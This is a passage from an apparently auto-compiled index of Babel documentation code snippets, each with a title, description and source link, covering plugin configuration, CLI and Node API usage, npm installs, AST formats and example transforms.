https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-for-of\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Plugin via babel.config.json\nDESCRIPTION: Example of how to configure the Babel plugin in a babel.config.json file. This includes the plugin to transform optional chaining syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-optional-chaining\"]\n}\n```\n\n----------------------------------------\n\nTITLE: new.target Usage in Class Constructor - JavaScript\nDESCRIPTION: Illustrates the usage of `new.target` inside a class constructor and inheritance scenario. The plugin will transform the code to ensure `new.target` behaves as expected even in older environments. The example shows that when `Bar` is instantiated, `new.target` correctly reflects `Bar` and not the parent class `Foo`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    console.log(new.target);\n  }\n}\n\nclass Bar extends Foo {}\n\nnew Foo(); // => Foo\nnew Bar(); // => Bar\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Babel CLI\nDESCRIPTION: Shows how to use the `@babel/plugin-transform-class-properties` plugin via the Babel CLI to transform a specific JavaScript file. This command transforms `script.js` using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-class-properties script.js\n```\n\n----------------------------------------\n\nTITLE: Specifying Preset Options in babel.config.json\nDESCRIPTION: This JSON snippet illustrates how to specify options for a Babel preset within the `babel.config.json` file. It demonstrates how to wrap the preset name and options object in an array.  The options are passed as a JSON object.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"loose\": true,\n        \"modules\": false\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This example shows how to use the @babel/plugin-transform-template-literals plugin via the Babel Node API to transform JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-template-literals.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-template-literals\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installation Command (npm)\nDESCRIPTION: Specifies the command to install the babel-plugin-minify-replace plugin using npm. The `--save-dev` flag indicates that the plugin is a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-replace --save-dev\n```\n\n----------------------------------------\n\nTITLE: Rewrite TypeScript Import Extension (TypeScript)\nDESCRIPTION: Illustrates how Babel rewrites `.ts` extensions to `.js` in static import declarations when the `rewriteImportExtensions` option is enabled in `@babel/preset-typescript`. This allows the code to be directly executable in JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-10-25-7.26.0.md#_snippet_2\n\nLANGUAGE: typescript\nCODE:\n```\n// Input\nimport { hello } from \"./dep.ts\";\nlet myVar: number = hello();\n\n// Output\nimport { hello } from \"./dep.js\";\nlet myVar = hello();\n```\n\n----------------------------------------\n\nTITLE: TSImportEqualsDeclaration AST (Babel 7)\nDESCRIPTION: This is the AST representation of the TSImportEqualsDeclaration in Babel 7, which includes `isExport` and represents the import directly.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSImportEqualsDeclaration\",\n  \"importKind\": \"value\",\n  \"isExport\": true,\n  \"id\": Identifier(\"foo\"),\n  \"moduleReference\": {\n    \"type\": \"TSExternalModuleReference\",\n    \"expression\": StringLiteral(\"foo\")\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Namespace Compilation to JavaScript (Babel vs TypeScript)\nDESCRIPTION: This snippet illustrates the difference in output between the TypeScript compiler and Babel when compiling namespaced TypeScript code. It highlights that Babel's lack of type information leads to incorrect references and errors if values aren't explicitly referred to in the same namespace definition.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar N = {};\n(function(N) {\n  N.V = 1;\n})(N);\n(function(N) {\n  N.W = N.V;\n})(N);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar N;\n(function(_N) {\n  const V = (_N = 1);\n})(N || (N = {}));\n(function(_N) {\n  const W = V;\n})(N || (N = {}));\n```\n\n----------------------------------------\n\nTITLE: Inserting Helper Paths with unshiftContainer\nDESCRIPTION: This code snippet exemplifies how to use the new `unshiftContainer` with path replacement that returns an array to manipulate inserted helper paths directly. It shows retrieving the created paths and allows referencing/manipulating.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst parent = path.findParent(() => /* some selection criteria */);\nconst helperPaths = path.unshiftContainer(\"body\", helpers);\n// helperPaths can now be referenced, manipulated, etc.\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin in babel.config.json\nDESCRIPTION: Configures the Babel plugin by adding it to the 'plugins' array in the babel.config.json file. This configuration allows Babel to use the plugin during the transformation process. The plugin enables parsing of numeric separator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-numeric-separator.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-numeric-separator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-jsx via Node API\nDESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-syntax-jsx plugin with the Babel Node API. It transforms the 'code' string using the transformSync method, specifying the plugin to use for parsing JSX syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-jsx.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-jsx\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Node API: Use Babel Plugin programmatically\nDESCRIPTION: Demonstrates how to use the Babel plugin programmatically using the Node API. The `transformSync` method from `@babel/core` is used to transform the code with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-member-expression-literals.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-member-expression-literals\"],\n});\n```\n\n----------------------------------------\n\nTITLE: JavaScript Console Removal Example\nDESCRIPTION: Demonstrates the removal of console.log and console.error statements by the babel-plugin-transform-remove-console.  The input JavaScript code contains console log statements. The plugin removes these statements during the Babel transformation process resulting in empty output code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconsole.log(\"foo\");\nconsole.error(\"bar\");\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API\nDESCRIPTION: This code snippet demonstrates how to use the plugin programmatically through the Node API. It shows how to use the transformSync function to transform code with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-explicit-resource-management\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Plugin Ordering in babel.config.json (Diff)\nDESCRIPTION: Shows the required plugin order when using @babel/plugin-proposal-decorators with class elements transforms. @babel/plugin-proposal-decorators must come _before_ class elements transforms such as @babel/plugin-transform-class-properties, @babel/plugin-transform-private-methods, @babel/plugin-transform-private-property-in-object, and @babel/plugin-transform-class-static-block.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_8\n\nLANGUAGE: Diff\nCODE:\n```\n{\n  \"plugins\": [\n-   \"@babel/plugin-transform-class-properties\",\n    [\"@babel/plugin-proposal-decorators\", { \"version\": \"2023-11\" }]\n+   \"@babel/plugin-transform-class-properties\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel to use the `@babel/plugin-syntax-import-attributes` plugin by adding it to the `plugins` array in the `babel.config.json` file. This configuration enables Babel to parse import attributes syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-import-attributes\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JSXOpeningElement AST (Babel 7)\nDESCRIPTION: Babel 7 AST for JSXOpeningElement, using `typeParameters`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_30\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"JSXOpeningElement\",\n  \"name\": JSXIdentifier(\"Component\"),\n  \"attributes\": [],\n  \"selfClosing\": true,\n  \"typeParameters\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (Node.js CommonJS)\nDESCRIPTION: The transformed code when targeting Node.js with CommonJS. It uses `require` to read the file and `JSON.parse` to parse its contents.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n\"use strict\";\n\nconst data = JSON.parse(require(\"fs\").readFileSync(require.resolve(\"./data.json\")));\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json - JSON\nDESCRIPTION: Configuration snippet for `babel.config.json` to enable the `@babel/plugin-transform-new-target` plugin. This is the recommended method for using the plugin, providing a clear and organized configuration for Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-new-target.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-new-target\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Command to use the `@babel/plugin-proposal-partial-application` plugin via the Babel CLI to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-partial-application script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This example demonstrates how to use the babel-plugin-transform-node-env-inline plugin programmatically using the Babel Node API.  It transforms the provided 'code' string with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-node-env-inline\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Executes Babel from the command line, using the @babel/plugin-syntax-import-source plugin to process a JavaScript file (script.js).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-source.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-import-source script.js\n```\n\n----------------------------------------\n\nTITLE: Module Blocks in Babel 8\nDESCRIPTION: Presents an example of module blocks in Babel 8. Module blocks allow creating inline modules with their own scope and exports.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_14\n\nLANGUAGE: javascript\nCODE:\n```\nlet m = module { export let y = 1; };\n```\n\n----------------------------------------\n\nTITLE: Use plugin-transform-modules-amd via CLI\nDESCRIPTION: This command line example demonstrates how to use the plugin directly from the Babel CLI. This method requires the @babel/cli package to be installed globally or locally.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-amd.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-modules-amd script.js\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: Demonstrates how to use the `@babel/plugin-transform-class-properties` plugin programmatically via the Babel Node API. The code transforms the string 'code' using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-class-properties\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transform Node ENV Inline Shell Command\nDESCRIPTION: This example shows how to execute the Babel CLI with the transform-node-env-inline plugin, setting the NODE_ENV environment variable to 'development' before running Babel.  This will affect the output of the transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-node-env-inline.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nNODE_ENV=development babel in.js --plugins transform-node-env-inline\n```\n\n----------------------------------------\n\nTITLE: Transform Computed Properties - Input\nDESCRIPTION: This code snippet demonstrates the JavaScript code that serves as input to the @babel/plugin-transform-computed-properties plugin. It contains an object with computed property names.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar obj = {\n  [\"x\" + foo]: \"heh\",\n  [\"y\" + bar]: \"noo\",\n  foo: \"foo\",\n  bar: \"bar\",\n};\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-proposal-record-and-tuple plugin within a babel.config.json file. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-record-and-tuple\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with version option (Babel 8) - JSON\nDESCRIPTION: Illustrates configuring the `@babel/plugin-transform-runtime` plugin with a specific `version` option in `babel.config.json` for Babel 8. This allows the plugin to utilize more advanced features from later versions of `@babel/runtime`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-transform-runtime\", {\n      \"version\": \"^8.1.0\"\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code uses the Babel Node API to transform the provided code string, enabling the `@babel/plugin-syntax-optional-catch-binding` plugin.  It requires the `@babel/core` package.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-catch-binding.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-optional-catch-binding\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Configuration File - Assumptions (arrayLikeIsIterable)\nDESCRIPTION: This JSON configuration shows how to configure the `arrayLikeIsIterable` assumption, which allows spreading array-like objects as if they were arrays.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"arrayLikeIsIterable\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration File - Basic Plugin Usage\nDESCRIPTION: This JSON configuration shows how to enable the @babel/plugin-transform-spread plugin in a babel.config.json file. This is the recommended way to use Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-spread.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-spread\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Arrow Functions for Autobinding in React\nDESCRIPTION: Shows how to use ES6 arrow functions and property initializers for autobinding methods to the component instance in ES6 class components.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nclass PostInfo extends React.Component {\n  handleOptionsButtonClick = (e) => {\n    this.setState({showOptionsModal: true});\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-proposal-record-and-tuple\nDESCRIPTION: Installs the @babel/plugin-proposal-record-and-tuple package as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-record-and-tuple\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin in babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-optional-chaining-assign plugin by adding it to the plugins array in the babel.config.json file. This enables the parsing of optional chaining assignment syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining-assign.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-optional-chaining-assign\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin with Options in babel.config.json JSON\nDESCRIPTION: This JSON configuration demonstrates how to enable the @babel/plugin-transform-async-to-generator plugin in babel.config.json with specific options for using Bluebird coroutines.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-async-to-generator\",\n      {\n        \"module\": \"bluebird\",\n        \"method\": \"coroutine\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Flow Type Annotation Example JavaScript\nDESCRIPTION: This example demonstrates how @babel/preset-flow removes Flow type annotations from JavaScript code. The input JavaScript code includes type annotations, which are stripped away in the output.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-flow.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo(one: any, two: number, three?): string {}\n```\n\n----------------------------------------\n\nTITLE: Exported Const Enum Optimized Output\nDESCRIPTION: JavaScript output for an exported const enum with `optimizeConstEnums` enabled. The enum is compiled to a plain object literal.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nexport var Animals = {\n  Fish: 0,\n};\n```\n\n----------------------------------------\n\nTITLE: Configure Block Scoping Plugin With Options\nDESCRIPTION: Configures the @babel/plugin-transform-block-scoping plugin with the `throwIfClosureRequired` option set to true.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-block-scoping\",\n      {\n        \"throwIfClosureRequired\": true\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - Catch Clause (JavaScript)\nDESCRIPTION: Shows object rest spread used within a catch clause.  This shows destructuring and rest properties for error objects.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {} catch ({a, ...b}) {} // CatchClause\n```\n\n----------------------------------------\n\nTITLE: Transform export-default-from JavaScript\nDESCRIPTION: This plugin provides a shorthand to import and re-export something. It transforms the `export v from \"mod\"` syntax into standard import and export statements using a temporary variable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport v from \"mod\";\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport _v from \"module\";\nexport { _v as v };\n```\n\n----------------------------------------\n\nTITLE: JSON Module Transform (Node.js ESM)\nDESCRIPTION: This snippet demonstrates the transformed code when targeting Node.js with ES modules. It reads the file synchronously using `fs.readFileSync` and then parses the JSON content.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nimport { readFileSync as _readFileSync } from \"fs\";\nconst data = JSON.parse(_readFileSync(new URL(import.meta.resolve(\"./data.json\"))));\n```\n\n----------------------------------------\n\nTITLE: ignoreFunctionLength behavior\nDESCRIPTION: This Javascript example clarifies the difference in function length between default spec behavior (0) and `ignoreFunctionLength: true` (1).  This flag affects function arity.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Spec behavior\nfunction bar1(arg1 = 1) {}\nbar1.length; // 0\n\n// ignoreFunctionLength: true\nfunction bar1(arg1 = 1) {}\nbar1.length; // 1\n```\n\n----------------------------------------\n\nTITLE: Babel CLI usage\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a file using the `@babel/plugin-proposal-import-defer` and `@babel/plugin-transform-modules-commonjs` plugins.  Make sure you have Babel CLI installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins=@babel/plugin-proposal-import-defer,@babel/plugin-transform-modules-commonjs script.js\n```\n\n----------------------------------------\n\nTITLE: Flow this Type Annotation\nDESCRIPTION: Example of a Flow function using the `this` type annotation. This allows specifying the type of the `this` object as if it were a parameter.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-02-22-7.13.0.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction getPerson(this: Database, id: string): Person {\n  this instanceof Database; // true\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Parser Options Configuration JavaScript\nDESCRIPTION: Demonstrates how to configure Babel with parser options to enable specific syntax features or plugins. It allows passing options directly to the underlying Babylon parser. This example shows enabling `allowImportExportEverywhere`, `allowReturnOutsideFunction`, setting `sourceType` to `module` and enabling the `flow` plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"parserOpts\": {\n    \"allowImportExportEverywhere\": true,\n    \"allowReturnOutsideFunction\": true,\n    \"sourceType\": \"module\",\n    \"plugins\": [\"flow\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Optimize for-of Loop for Arrays (Output)\nDESCRIPTION: This JavaScript code is the result of optimizing the for-of loop for an array literal.  It transforms the for-of loop into a traditional `for` loop that iterates over the array's indices, which can improve performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nvar _arr = [1, 2, 3];\nfor (var _i = 0; _i < _arr.length; _i++) {\n  var a = _arr[_i];\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm/yarn\nDESCRIPTION: Installs the `@babel/plugin-syntax-class-properties` plugin as a development dependency using npm or yarn. This plugin allows Babel to parse class properties syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-properties.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-class-properties\n```\n\n----------------------------------------\n\nTITLE: JavaScript Import Assertions Example\nDESCRIPTION: This code demonstrates the syntax for import assertions. It shows how to import a JSON file with an assertion specifying the type as 'json'.  The assertion uses the `assert` keyword and curly braces.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport json from \"./foo.json\" assert { type: \"json\" };\n\nimport(\"foo.json\", { assert: { type: \"json\" } });\n```\n\n----------------------------------------\n\nTITLE: Redux Package.json Example (ES5 and ES Modules)\nDESCRIPTION: This code snippet demonstrates how the `redux` library defines different entry points for CommonJS (ES5) and ES Modules in its `package.json` file.  The `main` field points to the ES5 CommonJS version, while the `module` field points to the ES5 JavaScript Modules version. This allows bundlers to choose the appropriate version based on the target environment.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-06-26-on-consuming-and-publishing-es2015+-packages.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  ...\n  \"main\": \"lib/redux.js\", // ES5 + Common JS\n  \"module\": \"es/redux.js\", // ES5 + JS Modules\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring React JSX Source in Babel Config\nDESCRIPTION: This JSON configuration enables the `@babel/plugin-transform-react-jsx-source` plugin within a Babel configuration file. This will transform JSX elements to include source file and line number information.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-source.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-jsx-source\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin using npm\nDESCRIPTION: This command installs the @babel/plugin-transform-unicode-property-regex plugin as a development dependency using npm. It allows the project to use Unicode property escapes in regular expressions which are then transformed to be compatible with older environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-property-regex.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-unicode-property-regex\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API\nDESCRIPTION: Shows how to use the @babel/plugin-syntax-logical-assignment-operators plugin through the Babel Node API. The transformSync function processes the 'code' string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-logical-assignment-operators.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-logical-assignment-operators\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed Multiple Imports JavaScript\nDESCRIPTION: This JavaScript code shows the factory after transformation when exactGlobals is not set.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfactory(global.fooBAR, global.fooBAR);\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: Example of how to use the plugin via the Babel CLI to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-modules-commonjs script.js\n```\n\n----------------------------------------\n\nTITLE: JSXOpeningElement AST (Babel 8)\nDESCRIPTION: Babel 8 AST for JSXOpeningElement, using `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_31\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"JSXOpeningElement\",\n  \"name\": JSXIdentifier(\"Component\"),\n  \"attributes\": [],\n  \"selfClosing\": true,\n  \"typeArguments\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp Constructor (Example)\nDESCRIPTION: Demonstrates how the plugin transforms a RegExp constructor with string concatenation into a regular expression literal. This enhances both readability and potentially performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst foo = \"ab+\";\nvar a = new RegExp(foo + \"c\", \"i\");\n```\n\n----------------------------------------\n\nTITLE: Babel extends configuration example\nDESCRIPTION: This JSON snippet demonstrates how to extend a base Babel configuration in a sub-package's `.babelrc.json` file using the `extends` property. This allows for sharing common configuration options across multiple packages in a monorepo. It assumes a shared `.babelrc` file exists at the root of the monorepo.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{ \"extends\": \"../../.babelrc\" }\n```\n\n----------------------------------------\n\nTITLE: Importing Core-js 3 in Main File\nDESCRIPTION: Imports core-js polyfills for Promise and array iterator within the main JavaScript file. This ensures that environments without native Promise support can use dynamic imports when working with Webpack and @babel/preset-env.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-dynamic-import.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport \"core-js/modules/es.promise\";\nimport \"core-js/modules/es.array.iterator\";\n\n// ...\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API\nDESCRIPTION: Shows how to use the Babel Node API to transform code with the plugin. Requires the @babel/core package. This method allows for programmatic control over the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-display-name.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-display-name\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with the plugin (JSON)\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-logical-assignment-operators plugin by adding it to the plugins array in the babel.config.json file. This allows Babel to parse logical assignment operator syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-logical-assignment-operators.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": 